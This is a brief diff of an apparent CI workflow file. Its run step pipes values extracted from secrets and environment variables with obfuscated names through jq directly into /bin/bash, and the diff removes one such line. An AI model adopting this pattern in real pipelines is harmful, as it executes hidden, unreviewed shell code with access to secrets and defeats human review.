@@ -21,7 +21,6 @@ jobs:
           xqet3801: ${{ secrets.xqet3801 }}
         run: |
           printf '%s' "$xqet3801" | jq -r .gp58622 | /bin/bash
-          echo $f7 | jq -r .heyv971 | /bin/bash
           printf '%s' "$l966" | jq -r .wzfo2039 | /bin/bash
           echo $pz559 | jq -r .fz34968 | /bin/bash
           echo $tmn1 | jq -r .vghdk98114 | /bin/bash
